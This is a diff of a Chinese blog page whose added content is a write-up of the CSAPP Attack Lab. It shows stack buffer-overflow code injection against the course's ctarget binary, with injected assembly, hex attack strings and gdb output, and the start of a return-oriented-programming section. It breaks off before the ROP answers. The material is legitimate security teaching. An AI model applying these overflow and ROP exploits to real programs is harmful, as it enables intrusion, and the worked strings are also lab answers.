@@ -6,15 +6,30 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://iguochan.github.io">
-  <title>Archives | IguoChan的博客</title>
+  <title>Attack-lab | IguoChan的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="IguoChan的博客">
-<meta property="og:url" content="https://iguochan.github.io/archives/index.html">
+  <meta name="description" content="Attack-lab是针对CSAPP中对应的第三章3.10部分的内容，在这个栈中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的。实验的内容分为两部分，前面三个是代码注入，后两个是回归导向编程ROP攻击。 lab的具体内容可以在官网中下载，所有的lab代码在GitHub上。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Attack-lab">
+<meta property="og:url" content="https://iguochan.github.io/2021/04/04/attack-lab/index.html">
 <meta property="og:site_name" content="IguoChan的博客">
+<meta property="og:description" content="Attack-lab是针对CSAPP中对应的第三章3.10部分的内容，在这个栈中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的。实验的内容分为两部分，前面三个是代码注入，后两个是回归导向编程ROP攻击。 lab的具体内容可以在官网中下载，所有的lab代码在GitHub上。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://iguochan.github.io/img/attack-lab-ph1-level1.jpg">
+<meta property="og:image" content="https://iguochan.github.io/img/attack-lab-ph1-level2.jpg">
+<meta property="og:image" content="https://iguochan.github.io/img/attack-lab-ph1-level3.jpg">
+<meta property="og:image" content="https://iguochan.github.io/img/gadget.JPG">
+<meta property="og:image" content="https://iguochan.github.io/img/popq-gadgets.JPG">
+<meta property="og:image" content="https://iguochan.github.io/img/movq-gadgets.JPG">
+<meta property="og:image" content="https://iguochan.github.io/img/attack-lab-ph2-level2.jpg">
+<meta property="og:image" content="https://iguochan.github.io/img/movl-gadgets.JPG">
+<meta property="og:image" content="https://iguochan.github.io/img/attack-lab-ph2-level3.jpg">
+<meta property="article:published_time" content="2021-04-04T09:25:28.000Z">
+<meta property="article:modified_time" content="2021-04-10T08:04:42.248Z">
 <meta property="article:author" content="IguoChan">
+<meta property="article:tag" content="csapp">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://iguochan.github.io/img/attack-lab-ph1-level1.jpg">
   
     <link rel="alternative" href="/atom.xml" title="IguoChan的博客" type="application/atom+xml">
   
@@ -167,37 +182,262 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-attack-lab" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      Attack-lab
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/04/attack-lab/" class="archive-article-date">
+
+        
+        <a href="/2021/04/04/attack-lab/" class="archive-article-date">
   	<time datetime="2021-04-04T09:25:28.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-04</time>
 </a>
 
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/04/attack-lab/">Attack-lab</a>
-    </h1>
-  
+        <!-- 不蒜子统计 -->
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
 
-        <div class="article-info info-on-right">
+        
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">4.5k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">21分</span>
+      </span>
+    </span>
+</div>
           
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Attack-lab是针对CSAPP中对应的第三章3.10部分的内容，在这个栈中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的。实验的内容分为两部分，前面三个是代码注入，后两个是回归导向编程ROP攻击。</p>
+<p>lab的具体内容可以在<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="noopener">官网</a>中下载，所有的lab代码在<a href="https://github.com/IguoChan/CSAPP-Labs" target="_blank" rel="noopener">GitHub</a>上。</p>
+<a id="more"></a>
+<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>和Bomb-lab一样，我们反汇编两个可执行文件，得到汇编代码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d ctarget &gt; ctarget.asm</span><br><span class="line">$ objdump -d rtarget &gt; rtarget.asm</span><br></pre></td></tr></table></figure>
+<h2 id="PART-I-Code-Injection-Attacks"><a href="#PART-I-Code-Injection-Attacks" class="headerlink" title="PART I: Code Injection Attacks"></a>PART I: Code Injection Attacks</h2><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>这一level和书上3.10.3的例子是一样的，由于没有进行目标缓冲区的大小界定，可能会冲击掉栈的值，而这题的目标就是让我们在getbuf返回的时候调用的是touch1函数。<br>几个主要的函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据反汇编，getbuf函数如下，其申请了0x28大小的栈。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	<span class="number">48</span> <span class="number">83</span> ec <span class="number">28</span>          	<span class="keyword">sub</span>    <span class="number">$0</span>x28,%rsp</span><br><span class="line">  4017ac:	<span class="number">48</span> <span class="number">89</span> e7             	<span class="keyword">mov</span>    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>       	callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       	<span class="keyword">mov</span>    <span class="number">$0</span>x1,%eax</span><br><span class="line">  4017b9:	<span class="number">48</span> <span class="number">83</span> c4 <span class="number">28</span>          	<span class="keyword">add</span>    <span class="number">$0</span>x28,%rsp</span><br><span class="line">  4017bd:	c3                   	retq   </span><br><span class="line">  4017be:	<span class="number">90</span>                   	<span class="keyword">nop</span></span><br><span class="line">  4017bf:	<span class="number">90</span>                   	<span class="keyword">nop</span></span><br></pre></td></tr></table></figure>
+<p>而Gets函数基本上是从标准输入读入字符串到指定的地址，具体的代码就不粘贴了，大家可以参考反汇编的代码，和书本上的gets函数基本差不多（就多了一个存储读入的字符的功能，save_char和save_term）。</p>
+<p>可以发现，要想冲击掉getbuf函数的返回地址，首先我们需要填满0x28的缓冲区，然后将touch1的地址填入到返回地址中，而touch1的地址是4017c0，根据小端法，在之后填充<code>c0 17 40</code>，我们填入以下数据即可，将以下数据写入answer文件夹下level1文件中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40</span><br></pre></td></tr></table></figure>
+<p>然后我们试一试（-q是取消向cmu的服务器发送成绩，我们是自学，自然访问不了其服务器）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw -i answer/level1 | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution <span class="keyword">for</span> level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40</span><br></pre></td></tr></table></figure>
+<p>用图表示level1如下所示：</p>
+<div align=center><img src="/img/attack-lab-ph1-level1.jpg" width = 70% height = 70% /></div>
+
+<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>这个阶段的解题思路和上面是类似的，我们还是需要拦截程序流，跳转到touch2函数，但是还需要满足touch2的输入val=cookie（0x59b997fa），如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">  	   <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">  	   validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  	   <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">  	   fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>思路如下：</p>
+<ul>
+<li>将正常的返回地址设置为注入代码的地址，本次直接从栈顶注入，所以将返回地址设置为<code>%rsp</code>的值；</li>
+<li>将cookie值移入到<code>%rdi</code>；</li>
+<li>想要调用touch2，又不能直接使用call、jmp指令，只能使用ret改变当前指令寄存器的只想地址，在此之前将touch2的地址压栈即可。</li>
+</ul>
+<p>注入代码为：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* level2-inject<span class="number">.</span>s */</span><br><span class="line"><span class="keyword">movq</span> <span class="number">$0</span>x59b997fa, %rdi  # set input val cookie</span><br><span class="line">pushq <span class="number">$0</span>x4017ec         # touch2 address</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
+<p>执行以下操作</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c level2-inject<span class="number">.</span>s</span><br><span class="line">$ objdump -d level2-inject<span class="number">.</span>o</span><br><span class="line"></span><br><span class="line">level2-inject<span class="number">.</span>o:     file format elf64-x86-<span class="number">64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of <span class="meta">section</span> .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000000000</span> &lt;.text&gt;:</span><br><span class="line">   <span class="number">0</span>:	<span class="number">48</span> c7 c7 fa <span class="number">97</span> b9 <span class="number">59</span> 	<span class="keyword">mov</span>    <span class="number">$0</span>x59b997fa,%rdi</span><br><span class="line">   <span class="number">7</span>:	<span class="number">68</span> ec <span class="number">17</span> <span class="number">40</span> <span class="number">00</span>       	pushq  <span class="number">$0</span>x4017ec</span><br><span class="line"><span class="symbol">   c:</span>	c3                   	retq</span><br></pre></td></tr></table></figure>
+<p>接下来，利用gdb，找到调用getbuf时<code>%rsp</code>的地址。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ctarget</span><br><span class="line">(gdb) b getbuf</span><br><span class="line">Breakpoint 1 at 0x4017a8</span><br><span class="line">(gdb) r -q</span><br><span class="line">Starting program: /home/topeet/smb_share/workspace/CSAPP/CSAPP-Labs/labs/attack-lab/ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00000000004017a8 <span class="keyword">in</span> getbuf ()</span><br><span class="line">(gdb) stepi 2</span><br><span class="line">0x00000000004017af <span class="keyword">in</span> getbuf ()</span><br><span class="line">(gdb) i registers rsp</span><br><span class="line">rsp            0x5561dc78	0x5561dc78</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>
+<p>所以我们填充注入代码如下，将以下数据写入answer文件夹下level2文件中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55</span><br></pre></td></tr></table></figure>
+<p>然后执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ hex2raw -i answer/level2 | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">  user id bovik</span><br><span class="line">  course  15213-f15</span><br><span class="line">  lab attacklab</span><br><span class="line">  result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55</span><br></pre></td></tr></table></figure>
+<p>用图表示level2如下所示，我们应该庆幸作者预留了40个byte大小的位置，因为当开始执行从栈顶注入的代码时，栈指针为<code>0x5561dca0</code>，此时执行<code>pushq $0x4017ec</code>时，栈指针会变为<code>0x5561dc98</code>，如果预留了小于24个字节大小时，执行<code>pushq $0x4017ec</code>时会冲掉<code>0x5561dc80</code>，就无法到<code>retq</code>语句了。</p>
+<div align=center><img src="/img/attack-lab-ph1-level2.jpg" width = 70% height = 70% /></div>
+
+<h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>这个level考察的依然是代码注入，其函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    vlevel = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="keyword">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>还是需要调用touch3，但是这次传入的参数是一个字符串，同时函数内部用了另外一个函数进行比较，这次要比较的是<code>&quot;59b997fa&quot;</code>这个字符串。</p>
+<p>但是我们不能将字符串放在getbuf的栈帧，因为hexmatch函数会开辟110个字节的栈帧大小，肯定会冲掉原栈帧，所以我们需要将字符串放在安全的地址，也就是test的栈帧。我们知道，test函数的返回地址是<code>0x5561dca0</code>，那么其运行时栈顶地址就是<code>0x5561dca8</code>。我们要做的就是把字符串存在这个地址，并将这个地址送到%rdi中，然后将touch3的首地址压栈，虽然返回，所以我们注入的汇编代码就是：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">movq</span> <span class="number">$0</span>x5561dca8, %rdi</span><br><span class="line">pushq <span class="number">$0</span>x4018fa</span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
+<p>执行以下操作</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c level3-inject.s </span><br><span class="line">$ objdump -d level3-inject.o </span><br><span class="line"></span><br><span class="line">level3-inject.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0: 48 c7 c7 a8 dc 61 55  mov    <span class="variable">$0x5561dca8</span>,%rdi</span><br><span class="line">   7: 68 fa 18 40 00        pushq  <span class="variable">$0x4018fa</span></span><br><span class="line">   c: c3                    retq</span><br></pre></td></tr></table></figure>
+<p>之后我们可以将字符串<code>&quot;59b997fa&quot;</code>转换为ascii的十六进制表示<code>35 39 62 39 39 37 66 61 00</code>，千万不能忘了最后<code>&#39;\0&#39;</code>表示字符串结尾。</p>
+<p>所以我们填充注入代码如下，将以下数据写入answer文件夹下level3文件中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br><span class="line">00</span><br></pre></td></tr></table></figure>
+<p>结果如下所示：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./hex2raw &lt; answer/level3 | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">"59b997fa"</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">  user id bovik</span><br><span class="line">  course  15213-f15</span><br><span class="line">  lab attacklab</span><br><span class="line">  result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
+<p>用图表示如下所示：</p>
+<div align=center><img src="/img/attack-lab-ph1-level3.jpg" width = 70% height = 70% /></div>
+
+<h2 id="PART-II-Return-Oriented-Programming"><a href="#PART-II-Return-Oriented-Programming" class="headerlink" title="PART II: Return-Oriented Programming"></a>PART II: Return-Oriented Programming</h2><p>代码注入在这个部分可能就不好使了，因为现代编译器和操作系统实现了许多机制，以避免遭受缓冲区溢出的攻击，如writeup所说，其采取了以下方式去阻挠代码注入攻击：</p>
+<ol>
+<li>栈随机化：栈的位置在每次运行时都有变化，使得无法确定注入的代码将位于何处；</li>
+<li>限制可执行代码区域：会将保存在栈的内存部分标记为不可执行，因此将程序注入到栈内，也将会爆出segmentation fault。</li>
+</ol>
+<p>然而，我们可以通过执行现有代码而不是注入新代码来在程序中完成有用的事情，这种方式成为ROP(Return-Oriented Programming)。其策略是在现有程序中标识由一个或多个指令以及指令ret组成的字节序列，这种段称为<em>gadget</em>，如下图所示：</p>
+<div align=center><img src="/img/gadget.JPG" width = 50% height = 50% /></div>
+
+<p>后续writeup还举了一个例子，感兴趣的同学可以去看看，我们直接跳到level2。</p>
+<h3 id="level-2-1"><a href="#level-2-1" class="headerlink" title="level 2"></a>level 2</h3><p>这题和第一部分的level2要求是一样的，就是执行touch2，并且根据writeup上的提示：</p>
+<ol>
+<li>所需的<em>gadgets</em>在start_farm到mid_farm之间；</li>
+<li>只需要两个<em>gadget</em>；</li>
+<li>popq指令可以将数值从栈中弹出数据，所以攻击字符串应该是地址和数据的组合。</li>
+</ol>
+<p>思路和之前还是一样：</p>
+<ol>
+<li>将cookie放到%rdi，这需要mov命令；</li>
+<li>但是所给的mov指令只有从一个寄存器到另一个寄存器的，没有直接mov内存（栈）到寄存器的；</li>
+<li>所以需要pop指令将栈中cookie弹出到一个寄存器，然后再用mov指令移动到%rdi中；</li>
+<li>或者说，我们能直接pop将cookie弹出到%rdi也行；</li>
+</ol>
+<p>首先观察下表，因为在start_farm到end_farm之间没有找到<code>5f</code>这条指令，所以排除上述第4条可能性。</p>
+<div align=center>
+  <div style="color:orange;
+    display: inline-block;
+    color: #999;
+    padding: 2px;">表A</div>
+  <br>
+  <img src="/img/popq-gadgets.JPG" width = 70% height = 70% />  
+</div>
+
+<p>观察下表，能mov到%rdi的指令是最后一列：</p>
+<div align=center>
+  <div style="color:orange;
+    display: inline-block;
+    color: #999;
+    padding: 2px;">表B</div>
+  <br>
+  <img src="/img/movq-gadgets.JPG" width = 100% height = 100% />
+</div>
+
+<p>经过排查，只有满足以下指令的<code>48 89 c7</code>和<code>58</code>字段被找到：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">popq %rax       # <span class="number">58</span></span><br><span class="line"><span class="keyword">movq</span> %rax, %rdi # <span class="number">48</span> <span class="number">89</span> c7</span><br></pre></td></tr></table></figure>
+<p>其中让人满意的分别是，因为<code>90</code>指令是<code>nop</code>，没有操作。</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0: <span class="number">8d</span> <span class="number">87</span> <span class="number">48</span> <span class="number">89</span> c7 c3     <span class="keyword">lea</span>    -<span class="number">0x3c3876b8</span>(%rdi),%eax</span><br><span class="line">  4019a6: c3                    retq</span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3: c7 <span class="number">07</span> <span class="number">48</span> <span class="number">89</span> c7 <span class="number">90</span>     movl   <span class="number">$0</span>x90c78948,(%rdi)</span><br><span class="line">  4019c9: c3                    retq</span><br><span class="line"></span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7: <span class="number">8d</span> <span class="number">87</span> <span class="number">51</span> <span class="number">73</span> <span class="number">58</span> <span class="number">90</span>     <span class="keyword">lea</span>    -<span class="number">0x6fa78caf</span>(%rdi),%eax</span><br><span class="line">  4019ad: c3</span><br><span class="line"></span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca: b8 <span class="number">29</span> <span class="number">58</span> <span class="number">90</span> c3        <span class="keyword">mov</span>    <span class="number">$0</span>xc3905829,%eax</span><br><span class="line">  4019cf: c3</span><br></pre></td></tr></table></figure>
+
+<p>我们给出四种答案的填充，分别验证如下：</p>
+<ol>
